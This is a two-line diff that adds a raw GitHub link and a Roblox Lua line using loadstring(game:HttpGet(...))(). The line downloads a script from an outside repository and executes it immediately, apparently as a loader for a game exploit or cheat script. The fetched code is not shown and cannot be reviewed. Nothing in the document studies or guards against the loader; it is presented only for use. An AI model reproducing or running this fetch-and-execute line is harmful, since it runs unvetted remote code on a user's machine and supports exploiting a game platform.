@@ -1,0 +1,2 @@
+https://raw.githubusercontent.com/VOIDv3/VOIDSCRIPTS/refs/heads/main/Universal
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/5c4bd8b1e17f1943da943a55.lua'))()
